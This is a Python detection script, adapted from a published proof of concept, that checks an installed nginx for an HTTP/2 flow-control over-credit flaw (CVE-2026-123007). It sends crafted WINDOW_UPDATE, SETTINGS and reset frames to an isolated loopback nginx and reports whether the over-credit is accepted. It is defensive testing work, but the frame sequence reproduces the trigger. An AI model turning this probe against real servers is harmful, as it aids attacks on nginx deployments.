#!/usr/bin/env python3
"""Exercise CVE-2026-123007 accounting in the installed nginx binary."""

# Copyright 2026 Censys, Inc.
# Copyright 2026 Sam James
# Modified to test an installed binary in an isolated loopback process.
# Protocol test adapted from Censys Research's Apache-2.0 compact PoC:
# https://github.com/Censys-Research/nginx2root/blob/main/h2c_flow_control_test.py
# SPDX-License-Identifier: Apache-2.0

import argparse
import ipaddress
import json
import os
import pwd
import shutil
import signal
import socket
import subprocess
import tempfile
import time
from pathlib import Path


MAX = 0x7FFFFFFF
PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

DATA = 0
HEADERS = 1
RST_STREAM = 3
SETTINGS = 4
PING = 6
GOAWAY = 7
WINDOW_UPDATE = 8

END_STREAM = 1
ACK = 1
END_HEADERS = 4

AUTHORITY = 1
PATH = 4
RANGE = 50


def frame(kind, flags, stream, data=b""):
    return (
        len(data).to_bytes(3, "big")
        + bytes((kind, flags))
        + stream.to_bytes(4, "big")
        + data
    )


def integer(value, bits, mask=0):
    maximum = (1 << bits) - 1
    if value < maximum:
        return bytes((mask | value,))
    data = bytearray((mask | maximum,))
    value -= maximum
    while value >= 128:
        data.append((value & 127) | 128)
        value >>= 7
    return bytes(data) + bytes((value,))


def literal(name, value):
    encoded = value.encode()
    return integer(name, 4) + integer(len(encoded), 7) + encoded


def request(stream, authority, path="/index.html", extra=b""):
    headers = b"\x82\x86" + literal(AUTHORITY, authority) + literal(PATH, path) + extra
    return frame(HEADERS, END_STREAM | END_HEADERS, stream, headers)


def setting(value):
    return frame(SETTINGS, 0, 0, b"\0\4" + value.to_bytes(4, "big"))


def update(stream, value):
    return frame(WINDOW_UPDATE, 0, stream, value.to_bytes(4, "big"))


def reset(stream):
    return frame(RST_STREAM, 0, stream, (8).to_bytes(4, "big"))


def decode_frames(buffer, data):
    buffer.extend(data)
    decoded = []
    while len(buffer) >= 9:
        length = int.from_bytes(buffer[:3], "big")
        if len(buffer) < 9 + length:
            break
        decoded.append((
            buffer[3],
            buffer[4],
            int.from_bytes(buffer[5:9], "big") & MAX,
            bytes(buffer[9:9 + length]),
        ))
        del buffer[:9 + length]
    return decoded


def has_goaway(events):
    return any(kind == GOAWAY for kind, _flags, _stream, _payload in events)


def has_flow_control_goaway(events):
    return any(
        kind == GOAWAY
        and len(payload) >= 8
        and int.from_bytes(payload[4:8], "big") == 3
        for kind, _flags, _stream, payload in events
    )


def has_ping_ack(events):
    return any(
        kind == PING and flags & ACK and stream == 0 and payload == b"POC-SYNC"
        for kind, flags, stream, payload in events
    )


class AccountingProbe:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.authority = f"{host}:{port}"
        self.events = []
        self.buffer = bytearray()
        self.sock = None

    def drain(self, seconds):
        self.sock.settimeout(0.25)
        deadline = time.monotonic() + seconds
        while time.monotonic() < deadline:
            try:
                data = self.sock.recv(262144)
                if not data:
                    return True
                self.events.extend(decode_frames(self.buffer, data))
            except socket.timeout:
                pass
        return False

    def run(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 262144)
        self.sock.settimeout(3)
        self.sock.connect((self.host, self.port))
        try:
            self.sock.sendall(
                PREFACE
                + frame(SETTINGS, 0, 0, b"\0\1\0\0\0\0\0\4\0\0\xff\xff")
            )
            self.drain(1)
            self.sock.sendall(frame(SETTINGS, ACK, 0))
            self.sock.sendall(
                b"".join(
                    request(stream, self.authority) for stream in range(1, 147, 2)
                )
                + request(
                    147,
                    self.authority,
                    extra=literal(RANGE, "bytes=0-126"),
                )
            )
            closed = self.drain(2)
            control_bytes = sum(
                len(payload)
                for kind, _flags, stream, payload in self.events
                if kind == DATA and 1 <= stream <= 147
            )
            if closed or has_goaway(self.events) or control_bytes != 65535:
                return {
                    "outcome": "INCONCLUSIVE",
                    "detail": "ordinary HTTP/2 control did not return exactly 65,535 bytes",
                    "control_bytes": control_bytes,
                }

            self.sock.sendall(update(0, MAX))
            if self.drain(1) or has_goaway(self.events):
                return {
                    "outcome": "INCONCLUSIVE",
                    "detail": "initial connection-window refill was rejected",
                    "control_bytes": control_bytes,
                }

            self.sock.sendall(request(157, self.authority, path="/big.bin"))
            if self.drain(1) or has_goaway(self.events):
                return {
                    "outcome": "INCONCLUSIVE",
                    "detail": "large fixture request was rejected",
                    "control_bytes": control_bytes,
                }

            for _ in range(122):
                self.sock.sendall(update(157, 65535))
                time.sleep(0.03)
            time.sleep(1.5)

            before_refund = len(self.events)
            self.sock.sendall(update(0, 4194304))
            closed = self.drain(1)
            refund_events = self.events[before_refund:]
            if has_flow_control_goaway(refund_events):
                return {
                    "outcome": "NO_OVER_CREDIT_OBSERVED",
                    "detail": "server rejected the four-MiB over-credit precursor",
                    "control_bytes": control_bytes,
                }
            if has_goaway(refund_events):
                return {
                    "outcome": "INCONCLUSIVE",
                    "detail": "server returned a non-flow-control GOAWAY at the four-MiB precursor",
                    "control_bytes": control_bytes,
                }
            if closed:
                return {
                    "outcome": "NO_OVER_CREDIT_OBSERVED",
                    "detail": "server rejected the four-MiB over-credit precursor",
                    "control_bytes": control_bytes,
                }

            self.sock.sendall(reset(157))
            closed = self.drain(2)
            if closed or has_goaway(self.events):
                return {
                    "outcome": "INCONCLUSIVE",
                    "detail": "connection ended before the one-byte accounting oracle",
                    "control_bytes": control_bytes,
                }

            before_probe = len(self.events)
            self.sock.sendall(update(0, 1))
            closed = self.drain(2)
            probe_events = self.events[before_probe:]
            if has_flow_control_goaway(probe_events):
                return {
                    "outcome": "NO_OVER_CREDIT_OBSERVED",
                    "detail": "server rejected the one-byte over-credit probe",
                    "control_bytes": control_bytes,
                }
            if has_goaway(probe_events):
                return {
                    "outcome": "INCONCLUSIVE",
                    "detail": "server returned a non-flow-control GOAWAY at the one-byte probe",
                    "control_bytes": control_bytes,
                }
            if closed:
                return {
                    "outcome": "NO_OVER_CREDIT_OBSERVED",
                    "detail": "server rejected the one-byte over-credit probe",
                    "control_bytes": control_bytes,
                }

            before_ping = len(self.events)
            self.sock.sendall(frame(PING, 0, 0, b"POC-SYNC"))
            closed = self.drain(3)
            ping_events = self.events[before_ping:]
            if not closed and not has_goaway(ping_events) and has_ping_ack(ping_events):
                return {
                    "outcome": "VULNERABLE",
                    "detail": "over-credit update was accepted and acknowledged on the same connection",
                    "control_bytes": control_bytes,
                }
            return {
                "outcome": "INCONCLUSIVE",
                "detail": "post-probe PING acknowledgement was absent",
                "control_bytes": control_bytes,
            }
        except OSError as error:
            return {
                "outcome": "INCONCLUSIVE",
                "detail": f"probe transport failed: {error}",
                "control_bytes": 0,
            }
        finally:
            self.sock.close()


def nginx_pids():
    pids = []
    for entry in Path("/proc").glob("[0-9]*"):
        try:
            if (entry / "comm").read_text().strip() == "nginx":
                pids.append(int(entry.name))
        except FileNotFoundError:
            continue
        except OSError as error:
            if entry.exists():
                raise RuntimeError(
                    f"could not inspect candidate process {entry.name}: {error}"
                ) from error
    return sorted(pids)


def free_port():
    with socket.socket() as listener:
        listener.bind(("127.0.0.1", 0))
        return listener.getsockname()[1]


def installed_nginx():
    executables = set()
    for pid in nginx_pids():
        try:
            target = os.readlink(f"/proc/{pid}/exe")
            if target.endswith(" (deleted)"):
                raise RuntimeError("a running nginx process uses a replaced executable")
            executable = target
            if Path(executable).is_file():
                executables.add(executable)
        except FileNotFoundError:
            continue
        except OSError as error:
            if Path(f"/proc/{pid}").exists():
                raise RuntimeError(
                    f"could not resolve executable for nginx PID {pid}: {error}"
                ) from error
    if len(executables) != 1:
        raise RuntimeError(
            f"expected one running nginx executable, found {len(executables)}"
        )
    return executables.pop()


def unprivileged_user():
    for name in ("nobody", "www-data", "nginx"):
        try:
            return pwd.getpwnam(name)
        except KeyError:
            continue
    raise RuntimeError("no unprivileged account is available for the test listener")


def wait_ready(process, port):
    for _ in range(50):
        if process.poll() is not None:
            return False
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.1):
                return True
        except OSError:
            time.sleep(0.1)
    return False


def installed_binary_test():
    production_before = nginx_pids()
    process = None
    root = None
    log = ""
    result = {
        "cve": "CVE-2026-123007",
        "test": "accounting-only-installed-binary",
        "scope": "loopback fixture; no production listener traffic",
    }
    try:
        executable = installed_nginx()
        user = unprivileged_user()
        root = Path(tempfile.mkdtemp(prefix="nginx2root-e2e-", dir="/tmp"))
        html = root / "html"
        run_dir = root / "run"
        html.mkdir()
        run_dir.mkdir()
        (html / "index.html").write_bytes(b"A" * 896)
        with (html / "big.bin").open("wb") as fixture:
            fixture.truncate(8 * 1024 * 1024)
        os.chmod(root, 0o755)
        os.chmod(html, 0o755)
        os.chown(run_dir, user.pw_uid, user.pw_gid)
        os.chmod(run_dir, 0o755)
        os.chmod(html / "index.html", 0o644)
        os.chmod(html / "big.bin", 0o644)

        port = free_port()
        config = root / "nginx.conf"
        config.write_text(
            "worker_processes 1;\n"
            "master_process off;\n"
            "daemon off;\n"
            f"pid {run_dir}/nginx.pid;\n"
            "error_log stderr notice;\n"
            "events { worker_connections 1024; }\n"
            "http {\n"
            "  access_log off;\n"
            "  default_type application/octet-stream;\n"
            "  sendfile on;\n"
            f"  server {{ listen 127.0.0.1:{port} http2; server_name localhost; "
            f"root {html}; location / {{ try_files $uri =404; }} }}\n"
            "}\n",
            encoding="utf-8",
        )
        os.chmod(config, 0o644)

        process = subprocess.Popen(
            [executable, "-p", f"{root}/", "-c", str(config)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE,
            text=True,
            start_new_session=True,
            user=user.pw_uid,
            group=user.pw_gid,
            extra_groups=[],
        )
        if not wait_ready(process, port):
            raise RuntimeError("isolated nginx listener did not start")

        result.update(AccountingProbe("127.0.0.1", port).run())
        if process.poll() is not None:
            result.update(
                outcome="INCONCLUSIVE",
                detail="the isolated nginx process exited during the active test",
            )
        result.update(
            executable=executable,
            test_uid=user.pw_uid,
            test_gid=user.pw_gid,
        )
    except (OSError, RuntimeError, subprocess.SubprocessError) as error:
        result.update(outcome="INCONCLUSIVE", detail=str(error))
    finally:
        process_stopped = True
        if process is not None:
            try:
                os.killpg(process.pid, signal.SIGTERM)
                process.wait(timeout=5)
            except (OSError, subprocess.TimeoutExpired):
                try:
                    os.killpg(process.pid, signal.SIGKILL)
                    process.wait(timeout=5)
                except (OSError, subprocess.TimeoutExpired):
                    pass
            process_stopped = process.poll() is not None
            if not process_stopped:
                result.update(
                    outcome="INCONCLUSIVE",
                    detail="the isolated nginx process could not be terminated",
                )
            elif process.stderr:
                log = process.stderr.read()[-4096:]
        if root is not None and process_stopped:
            shutil.rmtree(root)

    production_after = nginx_pids()
    production_unchanged = production_before == production_after
    if not production_unchanged:
        result.update(
            outcome="INCONCLUSIVE",
            detail="production nginx PID set changed during the test",
        )
    result.update(
        production_pids_before=production_before,
        production_pids_after=production_after,
        production_pids_unchanged=production_unchanged,
        test_log=log,
    )
    return result


def main():
    parser = argparse.ArgumentParser(description="Loopback-only calibration client")
    parser.add_argument("--probe-host", required=True)
    parser.add_argument("--probe-port", type=int, default=80)
    args = parser.parse_args()
    try:
        if not ipaddress.ip_address(args.probe_host).is_loopback:
            raise ValueError
    except ValueError:
        parser.error("--probe-host must be a numeric loopback address")
    result = AccountingProbe(args.probe_host, args.probe_port).run()
    result.update(
        cve="CVE-2026-123007",
        test="accounting-only-existing-listener",
    )
    print(json.dumps(result, sort_keys=True))
    return 0 if result["outcome"] in ("NO_OVER_CREDIT_OBSERVED", "VULNERABLE") else 2


if __name__ == "__main__":
    raise SystemExit(main())
